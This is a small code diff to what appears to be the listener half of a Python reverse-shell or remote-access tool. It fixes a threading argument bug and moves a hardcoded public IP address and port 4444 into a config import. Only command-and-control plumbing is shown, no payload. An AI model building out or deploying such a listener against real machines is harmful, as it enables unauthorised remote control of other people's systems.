@@ -141,7 +141,7 @@ class Listener:
 			
 			elif command == "exit":
 				self.close()
-				close_thread = threading.Thread(target=self.execute_remotely, args=("exit"))
+				close_thread = threading.Thread(target=self.execute_remotely, args=("exit",))
 				close_thread.start()
 				break
 
@@ -175,9 +175,8 @@ class Listener:
 
 
 if __name__ == "__main__":
-	listener = Listener("172.105.76.139", 4444)
-	# listener = Listener("192.168.0.108", 4444)
-	# listener = Listener("192.168.0.192", 4444)
+	from config import IP, PORT
+	listener = Listener(IP, PORT)
 
 	listen_thread = threading.Thread(target=listener.listen)
 	listen_thread.start()
